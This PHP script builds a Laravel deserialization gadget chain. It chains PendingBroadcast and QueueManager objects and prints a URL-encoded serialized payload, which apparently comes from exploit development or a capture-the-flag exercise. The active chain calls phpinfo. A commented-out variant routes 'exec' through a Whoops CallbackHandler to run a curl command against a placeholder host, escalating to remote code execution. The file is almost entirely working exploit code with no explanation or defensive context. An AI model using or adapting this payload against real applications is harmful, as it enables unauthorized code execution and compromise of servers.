<?php
namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        public function __construct($events, $event)
        {
            $this->event = $event;
            $this->events = $events;
        }
    }
}

namespace Illuminate\Queue
{
    class QueueManager{
        protected $app;
        protected $connectors = [];
        public function __construct()
        {
            $this->connectors=[
                'ma4ter'=>'phpinfo'
            ];
            $this->app = [
                'config'=>[
                    'queue.default'=>'ma4ter',
                    'queue.connections.ma4ter'=>['driver'=>'ma4ter']
                ]
            ];
        }
    }
}

namespace {
    $a=new Illuminate\Queue\QueueManager();
    $c = new Illuminate\Broadcasting\PendingBroadcast($a,null);
    echo urlencode(serialize($c));
}


//namespace Illuminate\Broadcasting {
//    class PendingBroadcast
//    {
//        public function __construct($events, $event)
//        {
//            $this->event = $event;
//            $this->events = $events;
//        }
//    }
//}
//
//namespace Whoops\Handler {
//
//    abstract class Handler
//    {
//        private $run = null;
//        private $inspector = null;
//        private $exception = 'curl http://xxxxx:8000/1';
//
//    }
//
//    class CallbackHandler extends Handler
//    {
//        protected $callable;
//
//        public function __construct($callable)
//        {
//            $this->callable = $callable;
//        }
//    }
//}
//
//namespace Illuminate\Queue {
//    class QueueManager
//    {
//        protected $app;
//        protected $connectors = [];
//
//        public function __construct()
//        {
//            $obj = new \Whoops\Handler\CallbackHandler('exec');
//            $this->connectors = [
//                'ma4ter' => [$obj, 'handle']
//            ];
//            $this->app = [
//                'config' => [
//                    'queue.default' => 'ma4ter',
//                    'queue.connections.ma4ter' => ['driver' => 'ma4ter']
//                ]
//            ];
//        }
//    }
//}
//
//namespace {
//    $a = new Illuminate\Queue\QueueManager();
//    $c = new Illuminate\Broadcasting\PendingBroadcast($a, null);
//    echo urlencode(serialize($c));
//}
